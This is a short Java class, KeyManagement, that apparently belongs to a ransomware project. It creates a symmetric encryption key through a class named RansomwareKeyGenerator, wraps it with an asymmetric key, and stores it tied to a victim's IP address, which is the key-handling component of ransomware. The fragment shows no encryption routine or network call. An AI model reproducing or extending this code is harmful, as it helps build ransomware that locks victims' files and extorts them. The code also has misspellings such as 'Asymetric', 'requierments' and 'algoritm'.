package app.keys;

import app.entities.CryptoKey;
import app.exceptions.AlgorithmNotFoundException;
import app.exceptions.InvalidCryptoKeyException;

public class KeyManagement implements Management {
	private RansomwareKeyGenerator generator;
	private AsymetricKeyWrapper wrapper;

	public KeyManagement() {
		generator = new RansomwareKeyGenerator();
		wrapper = new AsymetricKeyWrapper();
	}

	@Override
	public CryptoKey createAndSaveKey(String encalgo, String ip) throws InvalidCryptoKeyException {
		try {
			return new CryptoKey(ip, wrapper.wrapKey(generator.generateKey(encalgo), encalgo), encalgo);
		} catch (AlgorithmNotFoundException e) {
			throw new InvalidCryptoKeyException("Key requierments- algoritm not found", e);
		}

	}
}
